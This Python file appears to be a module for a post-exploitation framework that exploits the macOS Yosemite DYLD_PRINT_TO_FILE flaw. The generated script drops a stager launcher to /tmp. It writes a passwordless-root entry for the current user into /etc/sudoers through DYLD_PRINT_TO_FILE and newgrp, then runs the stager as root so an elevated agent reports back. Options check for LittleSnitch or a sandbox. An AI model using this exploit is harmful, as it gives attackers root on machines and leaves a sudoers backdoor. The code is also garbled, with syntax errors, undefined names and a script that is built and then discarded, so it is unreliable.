from lib.common import helpers



class Module:

    def __init__(self, mainMenu, params=[]):
        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Mac OSX Yosemite DYLD_PRINT_TO_FILE Privilege Escalation',

            # list of one or more authors for the module
            'Author': ['@checky_funtime'],

            # more verbose multi-line description of the module
            'Description': ('This modules takes advantage of the environment variable DYLD_PRINT_TO_FILE in order to escalate privileges on all versions Mac OS X Yosemite'
                            'WARNING: In order for this exploit to be performed files will be overwritten and deleted. This can set off endpoint protection systems and as of initial development, minimal testing has been performed.'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            # no need to base64 return data
            'OutputExtension': None,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                'References:',
                'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/osx/local/dyld_print_to_file_root.rb',
				'http://www.sektioneins.com/en/blog/15-07-07-dyld_print_to_file_lpe.html'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent used to Privesc from',
                'Required'      :   True,
                'Value'         :   ''
        }
            'FileName': {
            # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The filename to use when the temporary file is dropped to disk.',
                'Required'      :   False,
                'Value'         :   ''.join(random.choice(string.lowercase) for i in range(5))
        },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
        },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
        },
            'WriteablePath' : {
                'Description'   :   'Full path to where the file should be written. Defaults to /tmp/.',
                'Required'      :   True,
                'Value'         :   '/tmp/'
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):

        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        launcher = self.mainManu.stagers.generate_launcher(listenername, language='python', userAgent=userAgent, safeChecks=safeChecks)
        launcher += '\nrm -- "%0"'
        fullPath = self.options[WriteablePath]['Value'] + self.options[FileName]['Value']
        fileName = self.options[FileName]['Value']
        
        script = """
		import os
        print "Writing Stager to {filename}..."
        file = open({filename},"w")
        file.write({filecontents})
        file.close()
        print "Attempting to execute stager as root..."
        try:
		    os.system('/bin/sh -c "echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo {fullpath} &')
            print "Successfully ran command, you should be getting an elevated stager"
        except:
            print "[!] Could not execute payload!"
            
""" .format(fullpath=fullPath,filecontents=launcher, filename=fileName)
        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/..."
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        return script
